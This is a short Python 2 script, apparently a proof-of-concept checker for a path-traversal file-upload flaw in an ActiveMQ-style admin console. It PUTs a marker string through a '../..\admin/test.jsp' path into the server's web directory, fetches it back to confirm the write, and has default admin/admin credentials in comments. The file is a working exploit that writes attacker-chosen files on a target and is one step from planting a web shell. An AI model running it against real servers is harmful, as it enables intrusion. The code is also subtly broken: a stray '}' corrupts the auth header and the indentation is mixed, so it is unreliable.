# coding:utf-8
# windows下可以的
import urllib2
import sys
import base64


def verify(url, usr, pwd):
    uri = '{url}/admin/test.jsp'.format(url=url.rstrip('/'))
    target = r'{url}/fileserver/sex../../..\admin/test.jsp'.format(url=url.rstrip('/'))
    key = base64.b64encode(usr+":"+pwd)
    headers = {'Authorization': 'Basic %s}' % key, 'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/45.0'}
    put_data = '202cb962ac59075b964b07152d234b70'
    try:
        req1 = urllib2.Request(target, headers=headers, data=put_data)
        req2 = urllib2.Request(uri, headers=headers)
        req1.get_method = lambda: 'PUT'
        res1 = urllib2.urlopen(req1)
        res2 = urllib2.urlopen(req2)
        if res1.code == 204 and res2.code == 200:
            if put_data in res2.read():
                print "%s is vulnerable" % target
    except Exception, error:
        print error


def main():
    #url = "http://192.168.1.106:8161/"
	#usr = "admin"
	#pwd = "admin"
	url = sys.argv[1]
	usr = sys.argv[2]
	pwd = sys.argv[3]
    verify(url, usr, pwd)


if __name__ == '__main__':
    main()